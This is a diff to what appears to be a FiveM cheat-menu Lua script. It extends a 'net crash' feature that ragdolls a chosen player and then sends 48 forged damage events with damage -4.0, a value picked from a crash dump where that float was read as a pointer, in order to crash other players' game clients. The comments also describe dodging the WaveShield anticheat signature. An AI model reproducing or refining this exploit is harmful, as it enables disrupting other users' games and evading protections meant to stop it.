@@ -22118,6 +22118,21 @@ local NET = (function(O, C)
         pcall(EndTextCommandThefeedPostTicker, false, true)
     end
 
+    -- Force the target into ragdoll. The crash dump shows the AV inside the
+    -- weapon/refcount path (or word [ptr+0x214], 0x20) with ptr == 0xC0800000,
+    -- which is exactly float -4.0f: the damage float ended up where a pointer
+    -- was expected. The dump was taken while the victim was lying down. So the
+    -- prerequisite is a ragdolled target, and the payload is a damage of -4.0.
+    function NET.ragdoll(ped)
+        if type(Susano) ~= "table" or type(Susano.RequestRagdoll) ~= "function" then
+            return false
+        end
+        if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then
+            return false
+        end
+        return (pcall(Susano.RequestRagdoll, ped)) and true or false
+    end
+
     -- Synthetic damage event, anchored at the victim with the victim as both
     -- source and target. The server forwards the event to the clients that have
     -- the target in scope; the operator stays 250 m away, outside that scope.
@@ -22165,37 +22180,47 @@ local NET = (function(O, C)
             netToast("Net crash: select a target")
             return false
         end
-        if entry.dist < 250.0 then
-            O.log("net crash: target %.0f m, need 250 m", entry.dist)
-            netToast(("Net crash: move back to 250 m (now %.0f)"):format(entry.dist))
+        local ped = entry.ped
+        if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then
+            O.log("net crash: target ped not streamed")
+            netToast("Net crash: target out of stream")
             return false
         end
 
         NET.watch(25)
-        O.log("net crash: burst on %s at %.0f m", entry.name, entry.dist)
-        netToast(("Net crash: 24 hits on %s"):format(entry.name))
+        O.log("net crash: ragdoll + 48 events on %s at %.0f m", entry.name, entry.dist)
+        netToast(("Net crash: ragdoll + 48 x -4.0 on %s"):format(entry.name))
 
+        -- Every variant carries damage = -4.0, the exact value found in the
+        -- dump as the corrupted pointer (0xC0800000 = -4.0f). The rest cycles
+        -- the weapon and flag fields the damage resolver feeds into the
+        -- weapon/attachment refcount: run-over, fire (the WaveShield "send
+        -- crash" signature, sent with silenced=false so the check does not
+        -- fire), fists and rammed, with the action-result fields fuzzed.
         local variants = {
-            { dmg = 0.0,   flags = 522,      hc = 0 },
-            { dmg = 0.0,   flags = 525312,   hc = 0 },
-            { dmg = 1.0,   flags = 522,      hc = 0xFFFF },
-            { dmg = 1.0,   flags = 525312,   hc = 0xFFFF },
-            { dmg = 0.0,   flags = -1,       arh = -1, ari = -1, au = -1, hc = -1 },
-            { dmg = 1.0,   flags = 0x7FFFFFFF,
-              arh = 0x7FFFFFFF, ari = 0x7FFFFFFF, au = 0x7FFFFFFF, hc = 0x7FFF },
-            { dmg = 1.0e9, flags = 0,        arh = 0xFFFF, ari = 0xFFFF,
-              au = 0xFFFF, hc = 0xFFFF },
+            { dmg = -4.0, wpn = 0,          flags = 522 },
+            { dmg = -4.0, wpn = 1003267566, flags = 1581104 },
+            { dmg = -4.0, wpn = 2725352035, flags = 525312, hc = 0, ari = 0 },
+            { dmg = -4.0, wpn = 2725352035, flags = 454,    hc = 0, ari = 0 },
+            { dmg = -4.0, wpn = 2725352035, flags = 198,    hc = 0, ari = 0 },
+            { dmg = -4.0, wpn = 2725352035, flags = 524810, hc = 0, ari = 0 },
+            { dmg = -4.0, wpn = 133987706,  flags = 525312 },
+            { dmg = -4.0, wpn = 0,          flags = 0x7FFFFFFF,
+              arh = -1, ari = -1, au = -1, hc = -1 },
         }
 
         Citizen.CreateThread(function()
-            local hits = 0
-            for i = 1, 24 do
+            local hits, rags = 0, 0
+            for i = 1, 48 do
+                if i % 8 == 1 then
+                    if NET.ragdoll(ped) then rags = rags + 1 end
+                end
                 local v = variants[(i - 1) % #variants + 1]
                 if NET.damage(v) then hits = hits + 1 end
                 Citizen.Wait(120)
             end
-            O.log("net crash: %d/24 events sent", hits)
-            netToast(("Net crash: %d/24 events sent"):format(hits))
+            O.log("net crash: %d/48 events sent, %d ragdoll", hits, rags)
+            netToast(("Net crash: %d/48 sent, %d ragdoll"):format(hits, rags))
         end)
         return true
     end
